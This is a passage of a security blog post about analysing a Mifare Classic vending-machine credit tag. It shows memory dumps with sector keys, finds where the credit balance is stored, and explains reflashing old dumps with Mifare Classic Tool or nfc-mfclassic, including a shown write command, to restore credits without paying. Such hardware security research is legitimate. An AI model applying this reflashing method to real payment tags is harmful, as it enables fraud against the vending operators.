</span></span><span style="display:flex;"><span>000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000000b0  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
</span></span><span style="display:flex;"><span>000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000000d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000000e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000000f0  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
</span></span><span style="display:flex;"><span>00000100  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000120  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000130  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
</span></span><span style="display:flex;"><span>00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000160  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000170  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
</span></span><span style="display:flex;"><span>00000180  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000190  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000001a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000001b0  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
</span></span><span style="display:flex;"><span>000001c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000001d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000001e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000001f0  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
</span></span><span style="display:flex;"><span>00000200  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000220  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000230  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
</span></span><span style="display:flex;"><span>00000240  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000250  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000270  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
</span></span><span style="display:flex;"><span>00000280  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000290  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000002a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000002b0  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
</span></span><span style="display:flex;"><span>000002c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000002d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000002e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>000002f0  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
</span></span><span style="display:flex;"><span>00000300  88 01 00 84 00 04 b0 1a  00 00 5d 00 01 05 00 f1  |..........].....|
</span></span><span style="display:flex;"><span>00000310  01 01 01 ee ee ee ee ee  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000320  00 01 59 01 00 6f 00 01  00 00 00 00 8c c3 00 00  |..Y..o..........|
</span></span><span style="display:flex;"><span>00000330  a0 a1 a2 a3 a4 a5 1e 11  ee 5a ad 4f b3 33 88 bf  |.........Z.O.3..|
</span></span><span style="display:flex;"><span>00000340  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
</span></span><span style="display:flex;"><span>00000350  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
</span></span><span style="display:flex;"><span>00000360  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
</span></span><span style="display:flex;"><span>00000370  a0 a1 a2 a3 a4 a5 0f 00  ff 4f 2a 6d 92 05 e7 ca  |.........O*m....|
</span></span><span style="display:flex;"><span>00000380  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
</span></span><span style="display:flex;"><span>00000390  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
</span></span><span style="display:flex;"><span>000003a0  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
</span></span><span style="display:flex;"><span>000003b0  a0 a1 a2 a3 a4 a5 0f 00  ff e5 b8 a1 f6 13 cf 3d  |...............=|
</span></span><span style="display:flex;"><span>000003c0  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
</span></span><span style="display:flex;"><span>000003d0  dd dd dd dd dd dd dd dd  dd dd dd dd dd dd dd dd  |................|
</span></span><span style="display:flex;"><span>000003e0  00 00 51 5f 03 59 ef 00  00 00 00 00 4d 49 43 00  |..Q_.Y......MIC.|
</span></span><span style="display:flex;"><span>000003f0  a0 a1 a2 a3 a4 a5 4b 44  bb 5a be db 60 4c c9 d1  |......KD.Z..`L..|
</span></span></code></pre></div><p>The file shows all 16 sectors. Here is an example of one sector: 3x16 bytes of data followed by 16 bytes of access keys and accecss bits.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Block 0 | 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
</span></span><span style="display:flex;"><span>Block 1 | 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
</span></span><span style="display:flex;"><span>Block 2 | 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
</span></span><span style="display:flex;"><span>Block 3 | a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5
</span></span></code></pre></div><p>This is an empty block, Key A is <code>a0 a1 a2 a3 a4 a5</code>, Key B is <code>b0 b1 b2 b3 b4 b5</code> and the access bits are <code>78 77 88</code>. The value <code>69</code> is contained in a special register available for user data (see the Mifare Classic Datasheet for more information).</p>
<p>The next step is to locate the credits on the tag. The vending machine shows you the credits left on the tag when holding it to reader.</p>
<p><a href="/img/mifare/mifare_3.45.jpg"><img src="/img/mifare/mifare_3.45_thumb.jpg" alt="3.45" title="3.45"></a></p>
<p>So the tag currently contains exactly 3,45€. So lets first search for the Hex value of 45 (0x2d): Nothing found. Next we try to convert our 3,45€ to cents which will be 345 (0x01 0x59): Gotcha! The credits are located in sector 12 block 2 (counting starts at zero).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Block 0 | 88 01 00 84 00 04 b0 1a  00 00 5d 00 01 05 00 f1
</span></span><span style="display:flex;"><span>Block 1 | 01 01 01 ee ee ee ee ee  00 00 00 00 00 00 00 00
</span></span><span style="display:flex;"><span>Block 2 | 00 01 59 01 00 6f 00 01  00 00 00 00 8c c3 00 00
</span></span><span style="display:flex;"><span>Block 3 | a0 a1 a2 a3 a4 a5 1e 11  ee 5a ad 4f b3 33 88 bf
</span></span></code></pre></div><p><a href="/img/mifare/mifare_dump.png"><img src="/img/mifare/mifare_dump_thumb.png" alt="dump" title="dump"></a></p>
<p>We can verify this block by buying something from the machine or put some more credits on the tag and then read the appropriate sector again.</p>
<p><a href="/img/mifare/mifare_5.00.jpg"><img src="/img/mifare/mifare_5.00_thumb.jpg" alt="5.00" title="5.00"></a></p>
<p>You can decode the Access Bits via the App <a href="https://play.google.com/store/apps/details?id=at.mroland.android.apps.nfctaginfo&amp;hl=en">NFC TagInfo</a>.</p>
<p><a href="/img/mifare/mifare_accessbits.png"><img src="/img/mifare/mifare_accessbits_thumb.png" alt="accessbits" title="accessbits"></a></p>
<p>The App decodes the access bits for Sector 12 Block 2 to: &ldquo;Key B is needed for reading and writing to this block&rdquo;</p>
<p>The next step will be to reprogram the tag and add credits without paying for it.</p>
<p>PS: I never abused this finding for getting free drinks. I always subtracted my test buyings from the initial ammount. If you use this findings to get free drinks, this may have legal consequences for you so please do not abuse it.</p>
<p>To reprogram the tag I used the android app &ldquo;Mifare Classic Tool&rdquo; available under <a href="https://play.google.com/store/apps/details?id=de.syss.MifareClassicTool">https://play.google.com/store/apps/details?id=de.syss.MifareClassicTool</a>.
Sadly not every Android Phone supports these Mifare Classic tags. For example my old Samsung Galaxy S3 can read and write the tag, on my Nexus 5 it&rsquo;s not supported. You can find a list of supported and unsupported devices on the homepage <a href="https://github.com/ikarus23/MifareClassicTool/">https://github.com/ikarus23/MifareClassicTool/</a>.
This app lets you add your own keyfile (&ldquo;Add/Remove Keys&rdquo;) cracked by mfoc. Just create a new key file and insert your keys one per line. Using the write option you can write exactly one block back to the tag, or reflash a complete memory dump. Be careful when writing a direct block because if you overwrite the last block of a sector (the one containg the keys), your tag will be irreversible damaged. I did this to mine because I didn&rsquo;t notice the block numbers start at 0. So you can also create a full memory dump of your tag and when you have no credits left, reflash the old image and your credits will be reset.</p>
<p><a href="/img/mifare/mifare_write.png"><img src="/img/mifare/mifare_write_thumb.png" alt="write" title="write"></a></p>
<p>Another method is to reflash the captured output of mfoc via nfc-mfclassic:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># nfc-mfclassic w B output.mfd output.mfd
</span></span><span style="display:flex;"><span>NFC reader: pn532_uart:/dev/ttyUSB0 opened
</span></span><span style="display:flex;"><span>Found MIFARE Classic card:
</span></span><span style="display:flex;"><span>ISO/IEC 14443A (106 kbps) target:
</span></span><span style="display:flex;"><span>    ATQA (SENS_RES): 00  04
</span></span><span style="display:flex;"><span>       UID (NFCID1): 8e  db  1a  2a
</span></span><span style="display:flex;"><span>      SAK (SEL_RES): 08
</span></span><span style="display:flex;"><span>Guessing size: seems to be a 1024-byte card
</span></span><span style="display:flex;"><span>Writing 64 blocks |..failed to write trailer block 3
</span></span><span style="display:flex;"><span>x............................................................|
</span></span><span style="display:flex;"><span>Done, 62 of 64 blocks written.
</span></span></code></pre></div><p>After examining other tags for the same vending machine I noticed that these all have different keys. It seems like the vending machine calculates the keys based on the tags unique UID or something else to add an extra layer of security. So far I have not managed to crack the scheme. If you manage to derive the key from the captures below please contact me so I can verify it with other tags.</p>
<p>I put some dumps here for download if you want to investigate the key derivation scheme:</p>
<p><a href="/files/mifare/1.mfd">Tag 1</a></p>
<p><a href="/files/mifare/2.mfd">Tag 2</a></p>
<p><a href="/files/mifare/3.mfd">Tag 3</a></p>
                    </div>
                </section>
            </div>
            <div class="footer">
    <div class="pure-menu pure-menu-horizontal pure-menu-open">
        <ul>
            <li>Copyright by Christian Mehlmauer</li>
            <li>source code available on <a href="https://github.com/firefart/firefart.github.io">Github</a></li>
        </ul>
    </div>
</div>
<script type="text/javascript" src='https://firefart.at/js/all.js'></script>
<script type="text/javascript" src='https://firefart.at/js/firefart.js'></script>

<script type="text/javascript">
    var _paq = window._paq || [];
     
    _paq.push(["setCookieDomain", "*.firefart.at"]);
    _paq.push(['trackPageView']);
    _paq.push(['enableLinkTracking']);
    (function () {
        var u = "https://tracking.firefart.at/";
        _paq.push(['setTrackerUrl', u + 'mat.php']);
        _paq.push(['setSiteId', '1']);
        var d = document,
            g = d.createElement('script'),
            s = d.getElementsByTagName('script')[0];
        g.type = 'text/javascript';
        g.async = true;
        g.defer = true;
        g.src = u + 'mat.js';
        s.parentNode.insertBefore(g, s);
    })();
</script>
<noscript>
    <p><img src="https://tracking.firefart.at/mat.php?idsite=1&amp;rec=1" style="border:0;" alt="" /></p>
</noscript>

        </div>
    </div>
</div>
</body>

</html>